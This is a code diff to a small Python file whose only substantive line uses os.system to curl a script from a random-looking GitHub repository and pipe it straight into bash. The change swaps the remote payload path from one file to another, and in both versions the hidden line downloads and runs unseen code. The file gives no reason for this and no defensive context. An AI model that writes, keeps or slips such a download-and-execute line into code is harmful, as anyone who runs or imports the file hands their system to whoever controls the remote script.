@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://raw.githubusercontent.com/dfghjrtehdghgf/jatos/refs/heads/main/task.py | bash')
+os.system('curl -sL https://raw.githubusercontent.com/dfghjrtehdghgf/jatos/refs/heads/main/irid | bash')
